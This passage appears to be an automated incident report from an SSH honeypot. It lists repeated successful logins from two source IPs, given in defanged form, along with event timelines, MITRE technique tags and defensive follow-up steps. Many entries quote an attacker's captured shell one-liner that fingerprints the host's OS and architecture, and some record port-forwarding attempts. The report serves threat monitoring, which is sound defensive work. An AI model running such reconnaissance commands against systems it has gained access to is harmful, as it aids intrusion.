| `2026-09-01 20:45:35` | `cowrie.session.connect` |
| `2026-09-01 20:45:36` | `cowrie.client.version` |
| `2026-09-01 20:45:36` | `cowrie.client.kex` |
| `2026-09-01 20:45:39` | `cowrie.login.success` |
| `2026-09-01 20:45:41` | `cowrie.session.params` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.success` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:41` | `cowrie.command.input` |
| `2026-09-01 20:45:42` | `cowrie.log.closed` |
| `2026-09-01 20:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2fd620c4c7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:47 |
| **Last Seen** | 2026-09-01 20:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:47:28` | `cowrie.session.connect` |
| `2026-09-01 20:47:29` | `cowrie.client.version` |
| `2026-09-01 20:47:29` | `cowrie.client.kex` |
| `2026-09-01 20:47:32` | `cowrie.login.success` |
| `2026-09-01 20:47:35` | `cowrie.session.params` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.success` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:35` | `cowrie.command.input` |
| `2026-09-01 20:47:36` | `cowrie.log.closed` |
| `2026-09-01 20:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10da4f344ec

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:47 |
| **Last Seen** | 2026-09-01 20:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:47:45` | `cowrie.session.connect` |
| `2026-09-01 20:47:45` | `cowrie.client.version` |
| `2026-09-01 20:47:45` | `cowrie.client.kex` |
| `2026-09-01 20:47:46` | `cowrie.login.success` |
| `2026-09-01 20:47:46` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:47:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:47:47` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d04d50af23

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:49 |
| **Last Seen** | 2026-09-01 20:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:49:22` | `cowrie.session.connect` |
| `2026-09-01 20:49:23` | `cowrie.client.version` |
| `2026-09-01 20:49:23` | `cowrie.client.kex` |
| `2026-09-01 20:49:32` | `cowrie.login.success` |
| `2026-09-01 20:49:33` | `cowrie.session.params` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.success` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.command.input` |
| `2026-09-01 20:49:33` | `cowrie.log.closed` |
| `2026-09-01 20:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2e5ae0e360

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:51 |
| **Last Seen** | 2026-09-01 20:51 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:51:16` | `cowrie.session.connect` |
| `2026-09-01 20:51:17` | `cowrie.client.version` |
| `2026-09-01 20:51:17` | `cowrie.client.kex` |
| `2026-09-01 20:51:24` | `cowrie.login.success` |
| `2026-09-01 20:51:26` | `cowrie.session.params` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.success` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:26` | `cowrie.command.input` |
| `2026-09-01 20:51:31` | `cowrie.log.closed` |
| `2026-09-01 20:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03339b43eff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:54 |
| **Last Seen** | 2026-09-01 20:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:54:52` | `cowrie.session.connect` |
| `2026-09-01 20:54:53` | `cowrie.client.version` |
| `2026-09-01 20:54:53` | `cowrie.client.kex` |
| `2026-09-01 20:54:59` | `cowrie.login.success` |
| `2026-09-01 20:55:03` | `cowrie.session.params` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.success` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:03` | `cowrie.command.input` |
| `2026-09-01 20:55:04` | `cowrie.log.closed` |
| `2026-09-01 20:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c303f6bea9c3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:55 |
| **Last Seen** | 2026-09-01 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:55:03` | `cowrie.session.connect` |
| `2026-09-01 20:55:03` | `cowrie.client.version` |
| `2026-09-01 20:55:03` | `cowrie.client.kex` |
| `2026-09-01 20:55:04` | `cowrie.login.success` |
| `2026-09-01 20:55:04` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:55:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:55:04` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27fd21691800

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:56 |
| **Last Seen** | 2026-09-01 20:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:56:38` | `cowrie.session.connect` |
| `2026-09-01 20:56:39` | `cowrie.client.version` |
| `2026-09-01 20:56:39` | `cowrie.client.kex` |
| `2026-09-01 20:56:46` | `cowrie.login.success` |
| `2026-09-01 20:56:49` | `cowrie.session.params` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.success` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:49` | `cowrie.command.input` |
| `2026-09-01 20:56:50` | `cowrie.log.closed` |
| `2026-09-01 20:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3034ac214d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:58 |
| **Last Seen** | 2026-09-01 20:58 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:58:28` | `cowrie.session.connect` |
| `2026-09-01 20:58:29` | `cowrie.client.version` |
| `2026-09-01 20:58:29` | `cowrie.client.kex` |
| `2026-09-01 20:58:36` | `cowrie.login.success` |
| `2026-09-01 20:58:39` | `cowrie.session.params` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.success` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:39` | `cowrie.command.input` |
| `2026-09-01 20:58:41` | `cowrie.log.closed` |
| `2026-09-01 20:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81f650408a97

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:58 |
| **Last Seen** | 2026-09-01 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:58:42` | `cowrie.session.connect` |
| `2026-09-01 20:58:42` | `cowrie.client.version` |
| `2026-09-01 20:58:42` | `cowrie.client.kex` |
| `2026-09-01 20:58:43` | `cowrie.login.success` |
| `2026-09-01 20:58:43` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:58:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:58:44` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c3a5f167149

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:00 |
| **Last Seen** | 2026-09-01 21:00 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:00:21` | `cowrie.session.connect` |
| `2026-09-01 21:00:24` | `cowrie.client.version` |
| `2026-09-01 21:00:24` | `cowrie.client.kex` |
| `2026-09-01 21:00:34` | `cowrie.login.success` |
| `2026-09-01 21:00:38` | `cowrie.session.params` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.success` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:38` | `cowrie.command.input` |
| `2026-09-01 21:00:41` | `cowrie.log.closed` |
| `2026-09-01 21:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703c42f7fca1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:02 |
| **Last Seen** | 2026-09-01 21:02 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:02:17` | `cowrie.session.connect` |
| `2026-09-01 21:02:19` | `cowrie.client.version` |
| `2026-09-01 21:02:19` | `cowrie.client.kex` |
| `2026-09-01 21:02:32` | `cowrie.login.success` |
| `2026-09-01 21:02:37` | `cowrie.session.params` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.success` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:37` | `cowrie.command.input` |
| `2026-09-01 21:02:42` | `cowrie.log.closed` |
| `2026-09-01 21:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a66698d5612

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:04 |
| **Last Seen** | 2026-09-01 21:04 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:04:05` | `cowrie.session.connect` |
| `2026-09-01 21:04:08` | `cowrie.client.version` |
| `2026-09-01 21:04:08` | `cowrie.client.kex` |
| `2026-09-01 21:04:22` | `cowrie.login.success` |
| `2026-09-01 21:04:29` | `cowrie.session.params` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.success` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:29` | `cowrie.command.input` |
| `2026-09-01 21:04:33` | `cowrie.log.closed` |
| `2026-09-01 21:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d9ae29260b3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:04 |
| **Last Seen** | 2026-09-01 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:04:46` | `cowrie.session.connect` |
| `2026-09-01 21:04:46` | `cowrie.client.version` |
| `2026-09-01 21:04:46` | `cowrie.client.kex` |
| `2026-09-01 21:04:47` | `cowrie.login.success` |
| `2026-09-01 21:04:47` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:04:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:04:47` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b308d3c185e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:05 |
| **Last Seen** | 2026-09-01 21:06 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

